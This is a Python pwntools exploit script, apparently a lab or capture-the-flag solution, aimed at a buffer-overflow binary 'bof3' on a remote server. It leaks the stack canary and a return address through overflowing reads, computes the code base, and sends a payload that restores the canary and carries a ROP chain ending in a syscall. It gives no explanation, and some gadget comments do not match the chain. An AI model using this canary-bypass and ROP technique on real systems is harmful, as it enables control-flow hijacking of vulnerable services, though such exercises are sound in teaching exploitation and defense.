#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

"""
0x000000000000917f : pop rdi ; ret
0x0000000000057187 : pop rax ; ret
0x0000000000022210 : xor sil, 0x81 ; syscall
"""

rop_chain = [
    0x917f,
    6,
    0x57187,
    0x3c,
    0x8f34
]
print(type(0x6a), type(6.0))
rop_chain = [int(v) for v in rop_chain]

r.sendafter(b'? ',b'pass')

r.sendafter(b'? ', b'A' * 41)
r.recvuntil(b'A' * 41)
canary = r.recvuntil(b'\n')[:-1]
if len(canary) != 13:
    print('the length of the canary is not 13, try again!')
    exit(1)

r.sendafter(b'? ', b'A' * 56)
r.recvuntil(b'A' * 56)
RA = r.recvuntil(b'\n')[:-1]
ra_shift = int.from_bytes(RA, 'little') - int(0x8ad0)
for i in range(0, len(rop_chain), 2):
    rop_chain[i] += ra_shift
rop_chain = b''.join([v.to_bytes(8, 'little') for v in rop_chain])

r.sendafter(b': ', b'A' * 32 + b'\x01' + b'\x00' * 8 + canary + b'\x00\x00' + rop_chain)

r.recvuntil(b'you!\n')

print(r.recvall())
